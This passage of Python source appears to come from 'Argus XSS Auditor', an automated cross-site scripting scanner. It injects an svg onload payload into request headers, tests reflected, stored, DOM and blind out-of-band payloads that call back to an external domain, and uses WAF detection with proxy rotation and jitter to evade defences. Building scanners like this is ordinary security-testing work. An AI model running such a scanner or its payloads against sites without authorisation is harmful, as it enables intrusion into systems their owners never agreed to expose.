#  HEADER REFLECTION (opt-in)
# ═════════════════════════════════════════════════════════════════════════════

def test_header_injection(session: EvasionSession, host_url: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    for header in HEADER_INJECTION_VECTORS:
        marker = _new_marker()
        payload = f"<svg onload=alert('{marker}')>"
        resp = session.get(host_url, headers={header: payload})
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        idx = body.find(marker)
        if idx < 0:
            idx = body.find(payload)
            if idx < 0:
                continue
        context = classify_context(body, idx)
        findings.append(XSSFinding(
            target=host_url, param=f"(header:{header})",
            param_location="header",
            xss_type="header", context=context,
            severity=Severity.HIGH, confidence=75, confirmed=True,
            payload=payload, marker=marker,
            evidence=f"Header '{header}' reflected in {context} context",
            http_status=resp.status_code,
            details={"header": header, "context": context,
                     "body_snippet": body[max(0, idx - 80): idx + 120]},
        ))
        return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: EvasionSession, surface: dict, *,
    test_stored: bool = True,
    oob_settings: Optional[dict] = None,
    aggressive: bool = False,
    waf_vendor: str = "",
) -> tuple[Baseline, list[XSSFinding], Optional[dict]]:
    baseline = build_baseline(session, surface)
    if baseline.content_type and not _is_executable_content_type(baseline.content_type):
        return baseline, [], None

    reflection = probe_reflection(session, surface)
    if not reflection["reflected"]:
        jsonp = test_jsonp_injection(session, surface, baseline)
        if jsonp:
            return baseline, jsonp, None
        return baseline, [], None

    marker = reflection["marker"]
    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return baseline, [], None
    body = _body(resp)
    idx = body.find(marker)
    context = classify_context(body, idx) if idx >= 0 else "unknown"

    findings = test_context_payloads(
        session, surface, baseline, context,
        aggressive=aggressive, waf_vendor=waf_vendor,
    )
    findings.extend(test_jsonp_injection(session, surface, baseline))
    if test_stored:
        findings.extend(run_stored_candidates(session, surface, baseline))

    blind_payloads: list[dict] = []
    if oob_settings and oob_settings["mode"] != "disabled":
        blind_payloads = generate_blind_payloads(
            surface, oob_base_url=oob_settings["base_url"],
            oob_mode=oob_settings["mode"],
        )

    return baseline, findings, {
        "marker": marker, "context": context,
        "unencoded": reflection["unencoded"],
        "blind_payloads": blind_payloads,
    }


# ═════════════════════════════════════════════════════════════════════════════
#  EVIDENCE PRESERVATION
# ═════════════════════════════════════════════════════════════════════════════

def _save_evidence(finding: XSSFinding, baseline_body: str, evidence_dir: Path) -> None:
    try:
        evidence_dir.mkdir(parents=True, exist_ok=True)
        base = finding.finding_hash[:16]
        (evidence_dir / f"{base}_evidence.txt").write_text(
            f"finding_hash: {finding.finding_hash}\n"
            f"target: {finding.target}\n"
            f"param: {finding.param} ({finding.param_location})\n"
            f"xss_type: {finding.xss_type}\n"
            f"context: {finding.context}\n"
            f"severity: {finding.severity.value}\n"
            f"confidence: {finding.confidence}\n"
            f"confirmed: {finding.confirmed}\n"
            f"payload: {finding.payload}\n"
            f"evidence: {finding.evidence}\n"
            f"survived_chars: {finding.survived_chars}\n"
            f"encoded_chars: {finding.encoded_chars}\n"
            f"details: {json.dumps(finding.details, indent=2)}\n"
        )
        if baseline_body:
            (evidence_dir / f"{base}_baseline.html").write_text(baseline_body[:50000])
    except Exception as e:
        log.debug(f"evidence save failed: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  DB SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[XSSFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not importable")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB=False, skipping")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED=False, skipping")
        return
    if not getattr(DB, "available", False):
        log.warning("  DB sync: DB.available is False")
        return
    upsert = getattr(DB, "upsert_xss_findings", None)
    if upsert is None:
        log.error("  DB sync: db.py is missing upsert_xss_findings(scan_id, rows)")
        return
    try:
        payloads = [f.to_dict() for f in findings]
        n = upsert(scan_id, payloads)
        if n is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {n} row(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.error(f"  DB sync: exception — {type(e).__name__}: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xss_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    oob_mode: Optional[str] = None,
    test_stored: bool = True,
    test_dom: bool = True,
    test_headers: bool = False,
    aggressive: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
    oob_poll_wait: int = 0,
) -> Path:
    start = time.monotonic()
    settings = _xss_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    eff_jitter  = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])
    verify_tls  = settings["verify_tls"]

    oob = _oob_settings()
    if oob_domain:
        base = oob_domain if oob_domain.startswith(("http://", "https://")) \
               else f"https://{oob_domain}"
        oob["base_url"] = base.rstrip("/")
        oob["domain"] = urllib.parse.urlparse(base).hostname or oob_domain
        oob["mode"] = oob_mode or "huginn"
    if oob_mode:
        oob["mode"] = oob_mode

    urls = _load_urls(urls_file)
    if not urls:
        log.warning(f"  No URLs in {urls_file} — writing empty report")
        return _write_empty(outdir, urls_file, start)
    if len(urls) > MAX_URLS:
        log.warning(f"  Capping at {MAX_URLS} URLs (had {len(urls)})")
        urls = urls[:MAX_URLS]
    outdir.mkdir(parents=True, exist_ok=True)
    evidence_dir = outdir / "xss_evidence"

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    surfaces = discover_query_surfaces(urls)
    surfaces.extend(discover_body_surfaces(outdir))
    seen_s: set[tuple] = set()
    unique: list[dict] = []
    for s in surfaces:
        key = (s["url"], s["param"], s["location"])
        if key not in seen_s:
            seen_s.add(key)
            unique.append(s)
    surfaces = unique[:eff_max]

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    log.info(f"  Config : rate={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s  tls_verify={verify_tls}")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
    log.info(f"  Modes  : stored={test_stored}  dom={test_dom}  "
             f"headers={test_headers}  oob={oob['mode']}")
    if oob["base_url"]:
        log.info(f"  OOB    : {oob['base_url']} (mode={oob['mode']}, "
                 f"poll_wait={oob_poll_wait}s)")
    log.info("")

    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )
    all_findings: list[XSSFinding] = []
    blind_payloads: list[dict] = []
    results: list[dict] = []
    baseline_by_hash: dict[str, str] = {}
    waf_seen: dict[str, int] = {}

    with EvasionSession(profile=profile, headers=cfg_hdrs,
                        timeout=eff_timeout, verify_tls=verify_tls) as session:
        # Phase 0 — WAF detection
        log.info("  Phase 0 — WAF detection")
        waf_by_host: dict[str, WAFReport] = {}
        seen_hosts: set[str] = set()
        for s in surfaces[:50]:
            host = urllib.parse.urlparse(s["url"]).hostname or ""
            if not host or host in seen_hosts:
                continue
            seen_hosts.add(host)
            waf = detect_waf(session, s["url"])
            waf_by_host[host] = waf
            if waf.vendor != "unknown":
                log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

        if any(w.vendor != "unknown" for w in waf_by_host.values()):
            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
            session.profile.jitter = max(eff_jitter, 0.8)

        def _process(surface: dict) -> tuple[dict, list[XSSFinding], Optional[dict]]:
            try:
                host = urllib.parse.urlparse(surface["url"]).hostname or ""
                waf = waf_by_host.get(host, WAFReport())
                baseline, findings, reflection = audit_surface(
                    session, surface,
                    test_stored=test_stored,
                    oob_settings=oob,
                    aggressive=aggressive,
                    waf_vendor=waf.vendor,
                )
                if baseline.waf:
                    waf_seen[baseline.waf] = waf_seen.get(baseline.waf, 0) + 1
                return {
                    "url": surface["url"], "param": surface["param"],
                    "location": surface["location"],
                    "method": surface.get("method", "GET"),
                    "baseline": baseline.to_dict(),
                    "reflection": reflection,
                    "finding_count": len(findings),
                }, findings, reflection
            except Exception as e:
                log.debug(f"    error on {_redact_url(surface['url'])}: {e}")
                return {"url": surface["url"], "param": surface["param"],
                        "location": surface["location"],
                        "error": f"{type(e).__name__}: {e}"}, [], None

        log.info("")
        log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")
        interrupted = False
        try:
            with ThreadPoolExecutor(max_workers=eff_conc) as pool:
                futures = {pool.submit(_process, s): s for s in surfaces}
                done = 0
                for fut in as_completed(futures):
                    done += 1
                    try:
                        result, findings, reflection = fut.result()
                        results.append(result)
                        all_findings.extend(findings)
                        if reflection:
                            blind_payloads.extend(reflection.get("blind_payloads", []))
                        if findings:
                            top = findings[0]
                            log.info(
                                f"    [{done:>3}/{len(surfaces)}] {top.xss_type:<10} "
                                f"{top.severity.value:<8} {top.context:<20} "
                                f"{_redact_url(result['url'], 40)} param={result['param']}"
                            )
                        elif done % 20 == 0:
                            log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
                    except Exception as e:
                        log.debug(f"    future error: {type(e).__name__}: {e}")
        except KeyboardInterrupt:
            interrupted = True
            log.warning("  interrupted — writing partial results")

        all_findings.extend(blind_payloads_to_findings(blind_payloads))

        if test_dom:
            log.info("")
            log.info("  DOM XSS static analysis...")
            dom_findings = run_dom_analysis(session, outdir)
            all_findings.extend(dom_findings)
            log.info(f"    {len(dom_findings)} DOM finding(s)")

        log.info("")
        log.info("  CSP analysis...")
        csp_seen: set[str] = set()
        for s in surfaces[:50]:
            host = urllib.parse.urlparse(s["url"]).hostname or ""
            if host in csp_seen:
                continue
            csp_seen.add(host)
            resp = session.get(s["url"], timeout=8)
            if resp:
                all_findings.extend(analyze_csp(resp, s["url"]))
        log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'csp')} CSP finding(s)")

        if test_headers:
            log.info("")
            log.info("  Header reflection test...")
            header_seen: set[str] = set()
            for s in surfaces[:50]:
                host = urllib.parse.urlparse(s["url"]).hostname or ""
                if host in header_seen:
                    continue
                header_seen.add(host)
                all_findings.extend(test_header_injection(session, s["url"]))
            log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'header')} header finding(s)")

    # Dedupe
    seen_f: dict[str, XSSFinding] = {}
    for f in all_findings:
        h = f.finding_hash
        existing = seen_f.get(h)
        if existing is None or (f.confirmed, f.confidence) > (existing.confirmed, existing.confidence):
            seen_f[h] = f
    deduped = list(seen_f.values())

    # Chains
    log.info("")
    log.info("  Chain aggregation")
    chains = build_chains(deduped)
    log.info(f"    {len(chains)} chain(s)")

    for f in deduped:
        f.auth_enabled = auth_on
        if not f.first_seen:
            f.first_seen = _db_now()

    deduped.sort(key=lambda f: (-f.severity.rank, 0 if f.confirmed else 1,
                                -f.confidence, f.target))

    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_type: dict[str, int] = {}
    by_context: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]
    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_type[f.xss_type] = by_type.get(f.xss_type, 0) + 1
        if f.context:
            by_context[f.context] = by_context.get(f.context, 0) + 1
        if f.confirmed:
            _save_evidence(f, "", evidence_dir)

    # Flat outputs
    (outdir / "xss_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity.value}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )

    confirmed_refl = [f for f in confirmed_list
                      if f.xss_type in ("reflected", "stored", "header")]
    (outdir / "xss_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.context}\t{f.payload[:150]}"
            for f in confirmed_refl
        ) + ("\n" if confirmed_refl else "")
    )

    dom_list = [f for f in deduped if f.xss_type == "dom"]
    (outdir / "xss_dom.txt").write_text(
        "\n".join(
            f"{f.details.get('js_url', f.target)}\t"
            f"{f.details.get('source', '')}\t"
            f"{f.details.get('sink', '')}\t{f.evidence[:120]}"
            for f in dom_list
        ) + ("\n" if dom_list else "")
    )

    (outdir / "xss_blind.txt").write_text(
        "\n".join(
            f"{b['target']}\t{b['param']}\t{b['oob_token']}\t{b['payload']}"
            for b in blind_payloads
        ) + ("\n" if blind_payloads else "")
    )

    csp_list = [f for f in deduped if f.xss_type == "csp"]
    (outdir / "xss_csp.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.payload}\t{f.severity.value}\t{f.evidence[:120]}"
            for f in csp_list
        ) + ("\n" if csp_list else "")
    )

    blind_findings = [f for f in deduped if f.xss_type == "blind"]
    blind_confirmed = [f for f in blind_findings if f.confirmed]

    # ── Full report
    json_path = outdir / "xss_findings.json"
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at":   datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file":     str(urls_file),
        "scan_id":        scan_id,
        "interrupted":    interrupted,
        "aggressive":     aggressive,
        "config": {
            "test_stored":   test_stored, "test_dom": test_dom,
            "test_headers":  test_headers,
            "oob_mode":      oob["mode"], "oob_base_url": oob["base_url"],
            "authenticated": auth_on, "max_surfaces": eff_max,
            "rate_limit":    eff_rate, "jitter": eff_jitter,
            "concurrency":   eff_conc, "timeout": eff_timeout,
            "proxies":       len(eff_proxies),
            "verify_tls":    verify_tls,
        },
        "totals": {
            "urls_input":      len(urls), "surfaces_tested": len(surfaces),
            "total_findings":  len(deduped), "confirmed": len(confirmed_list),
            "blind_findings":  len(blind_findings),
            "blind_confirmed": len(blind_confirmed),
            "blind_payloads":  len(blind_payloads),
            "dom_findings":    len(dom_list), "csp_surfaces": len(csp_list),
            "critical":        by_sev["CRITICAL"], "high": by_sev["HIGH"],
            "medium":          by_sev["MEDIUM"], "low": by_sev["LOW"],
            "info":            by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
            "by_context":  dict(sorted(by_context.items(), key=lambda kv: -kv[1])),
            "waf_hits":    waf_seen,
        },
        "results":        results,
        "findings":       [f.to_dict() for f in deduped],
        "blind_payloads": blind_payloads,
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Confirmed-only report
    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
    (outdir / "xss_confirmed.json").write_text(
        json.dumps({
            "schema_version": FINDING_SCHEMA_VERSION,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical":  sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
                "high":      sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
                "blind_confirmed": len(blind_confirmed),
                "by_chain":  {cid: sum(1 for f in confirmed_high if cid in f.chain_ids)
                              for cid in {x for f in confirmed_high for x in f.chain_ids}},
            },
            "findings": [f.to_dict() for f in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # ── Chains
    (outdir / "xss_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    if scan_id is not None:
        _self_sync(scan_id, deduped)
    else:
        log.debug("  DB sync: no --scan-id provided, skipping")

    if (oob_poll_wait > 0 and blind_findings and not blind_confirmed
            and oob["base_url"]):
        log.info("")
        log.info(f"  OOB verification (polling up to {oob_poll_wait}s/token)...")
        try:
            verify_blind_findings(outdir, oob_base_url=oob["base_url"],
                                  read_key=oob["read_key"] or None,
                                  max_wait=oob_poll_wait, scan_id=scan_id)
        except Exception as e:
            log.warning(f"    OOB verification failed: {type(e).__name__}: {e}")

    log.info("")
    log.info("  Outputs :")
    log.info(f"    xss_findings.json            {len(deduped):>5} finding(s)")
    log.info(f"    xss_confirmed.json           {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    xss_chains.json              {len(chains):>5} chain(s)")
    log.info(f"    xss_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xss_confirmed.txt            {len(confirmed_refl):>5} reflected/stored/header")
    log.info(f"    xss_dom.txt                  {len(dom_list):>5} DOM finding(s)")
    log.info(f"    xss_blind.txt                {len(blind_payloads):>5} blind payload(s)")
    log.info(f"    xss_csp.txt                  {len(csp_list):>5} CSP surface(s)")
    if confirmed_high:
        log.info(f"    xss_evidence/                {len(confirmed_list):>5} evidence file(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
        f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}"
    )
    if by_type:
        log.info("  Type     : " + " · ".join(f"{k}({v})" for k, v in by_type.items()))
    if by_context:
        log.info("  Context  : " + " · ".join(f"{k}({v})" for k, v in by_context.items()))
    if waf_seen:
        log.info("  WAF      : " + " · ".join(f"{k}({v})" for k, v in waf_seen.items()))
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains
        ))

    if blind_findings:
        log.info("")
        log.info(f"  Blind OOB: {len(blind_findings)} candidate(s), "
                 f"{len(blind_confirmed)} confirmed via callback")
        if blind_payloads and not blind_confirmed:
            log.info("    Deploy payloads from xss_blind.txt, then run:")
            log.info(f"      python -m auditing_tools.xss_finder --verify-oob "
                     f"--oob-poll-wait 120"
                     + (f" --scan-id {scan_id}" if scan_id else ""))

    if confirmed_high:
        log.info("")
        log.info("  Confirmed findings (top 10):")
        for f in confirmed_high[:10]:
            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
            log.info(f"    [{f.severity.value:<8}] {f.xss_type:<10} "
                     f"{f.context:<20} {f.param:<16} "
                     f"{_redact_url(f.target, 50)}{tag}")

    if interrupted:
        log.info("")
        log.warning("  Partial results written — scan was interrupted")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(outdir: Path, input_file: Path, start: float) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at":   datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file":     str(input_file), "config": {}, "aggressive": False,
        "totals": {
            "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
            "confirmed": 0, "blind_findings": 0, "blind_confirmed": 0,
            "blind_payloads": 0, "dom_findings": 0, "csp_surfaces": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_type": {}, "by_context": {}},
        "results": [], "findings": [], "blind_payloads": [],
    }
    path = outdir / "xss_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "xss_confirmed.json").write_text(json.dumps({
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0,
                   "blind_confirmed": 0, "by_chain": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "xss_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(), "chains": [],
    }, indent=2) + "\n")
    for name in ("xss_candidates.txt", "xss_confirmed.txt", "xss_dom.txt",
                 "xss_blind.txt", "xss_csp.txt"):
        (outdir / name).write_text("")
    (outdir / "xss_evidence").mkdir(exist_ok=True)
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE CLI
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s",
                        handlers=[logging.StreamHandler(sys.stdout)])
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_xss.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus XSS Auditor v5.0")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--header", action="append", default=[],
                        metavar="NAME=VALUE", help="Extra header (repeatable)")
    parser.add_argument("--oob-domain", help="OOB domain (Huginn)")
    parser.add_argument("--oob-mode", choices=["path", "subdomain"], default=None)
    parser.add_argument("--no-stored", action="store_true")
    parser.add_argument("--no-dom", action="store_true")
    parser.add_argument("--test-headers", action="store_true")
    parser.add_argument("--aggressive", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--verify-oob", action="store_true",
                        help="Standalone mode: only poll Huginn for existing "
                             "blind findings and update xss_findings.json")
    parser.add_argument("--oob-poll-wait", type=int, default=0)
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if "=" in h:
            k, v = h.split("=", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie

    proxies = args.proxies.split(",") if args.proxies else None

    try:
        if args.verify_oob:
            oob = _oob_settings()
            base_url = oob["base_url"]
            if args.oob_domain:
                base_url = (args.oob_domain if args.oob_domain.startswith(
                    ("http://", "https://")) else f"https://{args.oob_domain}").rstrip("/")
            if not base_url:
                log.error("--verify-oob requires OAST_DOMAIN or --oob-domain")
                sys.exit(2)
            result = verify_blind_findings(
                args.output, oob_base_url=base_url,
                read_key=oob["read_key"] or None,
                max_wait=max(args.oob_poll_wait, 0),
                scan_id=args.scan_id,
            )
            log.info(f"  OOB verify result: {result}")
        else:
            run_xss_scan(
                args.input, args.output,
                headers=headers or None,
                oob_domain=args.oob_domain, oob_mode=args.oob_mode,
                test_stored=not args.no_stored, test_dom=not args.no_dom,
                test_headers=args.test_headers,
                aggressive=args.aggressive,
                max_surfaces=args.max_surfaces,
                concurrency=args.concurrency, rate_limit=args.rate_limit,
                timeout=args.timeout, proxies=proxies,
                scan_id=args.scan_id, oob_poll_wait=args.oob_poll_wait,
            )
    except KeyboardInterrupt:
        log.warning("interrupted by user")
        sys.exit(130)
    except Exception as e:
        log.error(f"failed: {type(e).__name__}: {e}")
        import traceback; log.debug(traceback.format_exc()); sys.exit(1)
